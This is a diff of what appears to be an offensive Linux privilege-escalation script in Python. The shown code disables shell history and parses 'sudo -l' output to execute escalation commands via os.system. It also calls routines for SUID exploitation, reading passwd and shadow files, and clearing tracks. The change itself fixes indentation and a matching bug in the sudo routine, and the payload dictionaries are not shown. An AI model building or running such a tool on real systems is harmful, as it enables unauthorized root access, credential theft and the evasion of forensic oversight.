@@ -49,7 +49,7 @@ def disable_hist():
 
 
 # check for binaries that can be run as sudo and print privesc script to screen
-def sudo_l(sudo_no_pass):
+def sudo_l():
     print("\n###--- please run 'sudo -l > /tmp/sudo_l.txt' before running this script to find sudoable commands ---###")
     time.sleep(5)
     print("\n### finding binaries you can run as sudo... ###")
@@ -99,22 +99,22 @@ def sudo_l(sudo_no_pass):
         lower_line = last_line.lower()
         print(lower_line)
 
-    # loop through dictionaries and print cmds if need user interaction, otherwise execute
-    for key in sudo_bins_print:
-        if key in last_line:
-            print("{}: {}".format(key,value))
-            continue
-        else:
-            continue
+        # loop through dictionaries and print cmds if need user interaction, otherwise execute
+        for key in sudo_bins_print:
+            if key in lower_line:
+                print("{}: {}".format(key,value))
+                continue
+            else:
+                continue
 
-    for key in sudo_bins_exec:
-        if key in last_line:
-            print("{}: {}".format(key,value))
-            sudo_cmd = value.strip()
-            os.system(sudo_cmd)
-            exit()
-        else:
-            continue
+        for key in sudo_bins_exec:
+            if key in lower_line:
+                print("{}: {}".format(key,value))
+                sudo_cmd = value.strip()
+                os.system(sudo_cmd)
+                exit()
+            else:
+                continue
 
 
 # try SUID/GUID files exloitation
@@ -286,7 +286,7 @@ def clear_tracks():
 
 # - call functions -
 disable_hist()
-sudo_l(sudo_no_pass)
+sudo_l()
 suid()
 path()
 pass_shadow()
